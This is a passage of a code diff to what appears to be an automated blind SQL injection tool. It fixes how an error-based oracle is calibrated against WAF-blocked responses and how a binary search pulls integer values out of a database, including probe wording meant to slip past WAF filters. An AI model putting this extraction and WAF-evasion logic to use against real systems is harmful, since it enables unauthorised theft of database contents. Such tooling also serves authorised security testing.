                                 and _t_st == self._baseline_status
                                 and _f_st == _t_st
                                 and _body_size_diff >= 100):
-                            self._working_template = tpl
-                            self._working_prefix = _prefix
-                            self._body_size_oracle = True
-                            self._true_oracle_size = _t_body_len
-                            self._false_oracle_size = _f_body_len
-                            self._true_oracle_status = _t_st
-                            self._false_oracle_status = _f_st
-                            print("[+] [ErrorOracle] Calibrated (body-size mode, WAF-blocked baseline): "
-                                  f"true={_t_body_len}B vs false={_f_body_len}B "
-                                  f"(ctx={_prefix!r} template: {tpl[:40]}...)", flush=True)
-                            return True
+                            LOG.debug("[ErrorOracle] Skipping body-size oracle: baseline=%d, "
+                                      "true=%d, false=%d all at same WAF status — body-size "
+                                      "variation is WAF noise, not SQL signal",
+                                      self._baseline_status, _t_st, _f_st)
+                            continue  # try next template instead of accepting noisy oracle
                         _ceo_cal_waf = {400, 403, 406, 429, 430, 503}
                         if (_t_st in _ceo_cal_waf and _t_st < 500
                                 and _t_st != self._baseline_status):
@@ -164756,6 +164833,18 @@ class ConditionalErrorOracle:
                             and _ceo_resp_sc != self._true_oracle_status
                             and _ceo_resp_sc != self._false_oracle_status):
                         return None
+                    # FIX-CEO-EVAL-SAME-STATUS-PROXIMITY: when both calibrated statuses are the
+                    # same (e.g. both 400, symmetric WAF blocking), the original status guard
+                    # above is skipped (`_true_oracle_status != _false_oracle_status` is False).
+                    # In this case, verify that the probe body size is "close" to one of the
+                    # calibrated sizes.  If the probe is equidistant (ambiguous) or outside the
+                    # oracle range, return None instead of guessing — prevents garbage extraction.
+                    if (self._true_oracle_status != 0
+                            and self._true_oracle_status == self._false_oracle_status
+                            and _ceo_resp_sc == self._true_oracle_status):
+                        _oracle_range = max(abs(self._true_oracle_size - self._false_oracle_size), 1)
+                        if min(_to_true, _to_false) > _oracle_range * 0.50:
+                            return None  # probe body size outside oracle signal range — ambiguous
                     return _to_true < _to_false
                 if (_ceo_sc in _ceo_waf_codes
                         and _ceo_sc < 500
@@ -166061,29 +166150,28 @@ class ParallelCharExtractor:
         return ''
     
     async def _extract_int(self, query: str, max_val: int = 1000) -> int:
-        low, high = 0, max_val
-        while low <= high:
+        # FIX-PCE-EXTRACT-INT-STYLE-A: Convert Style B (inclusive-hi, eq-probe) to Style A
+        # (exclusive-hi, lo-as-result) to match _randomized_mid's exclusive-hi contract.
+        # Same mismatch as Enumerator._extract_str: _randomized_mid treats hi as exclusive
+        # but old code passed inclusive max_val. With noisy oracle, eq probe randomly fires
+        # at a wrong mid → return mid produces inflated length (300-400+ chars).
+        low, high = 0, max_val + 1  # hi is exclusive
+        while low < high:
             # BUG-PARALLELCHAR-STOP FIX: Abort when extraction cancelled.
             if not _EXTRACTION_ACTIVE[0]:
                 break
-            # BUG-V164-INFERENCE-ADDITIONAL-BISECT-FIXED-PIVOTS FIX:
-            # Fixed pivot in ParallelCharExtractor._extract_int.
-            # Fix: use _randomized_mid(low, high) (TECHNIQUE-3).
             mid = _randomized_mid(low, high)
             try:
-                # BUG-V137-BESIMPLE-BISECT-STRICT-GT FIX: was >{mid}, now >={mid+1}.
-                # WAFs block strict >\d+; >={mid+1} is semantically identical for ints.
                 gt = await self._eval_fn(f"({query})>={mid+1}")
-                if gt:
+                if gt is None:
+                    break  # WAF-blocked probe — abort
+                elif gt:
                     low = mid + 1
                 else:
-                    eq = await self._eval_fn(f"({query})={mid}")
-                    if eq:
-                        return mid
-                    high = mid - 1
+                    high = mid
             except Exception:
                 break
-        return low
+        return min(low, max_val)  # cap to max_val (handles always-True oracle → lo=max_val+1)
 
 
 #  3. Rate-Limit Auto-Calibration (enhanced: binary search, Retry-After) 
